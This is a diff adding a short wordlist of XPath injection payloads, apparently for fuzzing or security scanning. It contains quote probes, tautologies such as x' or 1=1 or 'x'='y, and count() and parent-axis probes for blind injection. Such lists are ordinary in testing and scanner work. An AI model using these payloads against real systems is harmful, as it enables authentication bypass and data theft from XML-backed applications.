@@ -1,0 +1,25 @@
+'
+"
+,
+2wef'='2wef
+ctu'='awrh
+496=496
+552=6078
+' or count(parent::*[position()=1])=0 or 'a'='b
+' or count(parent::*[position()=1])>0 or 'a'='b
+1 or count(parent::*[position()=1])=0
+1 or count(parent::*[position()=1])>0
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+' or ''='
+' or '145'='145
+' or '743'='909
+*/*
+/
+//
+//*
+@*
+count(/child::node())
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
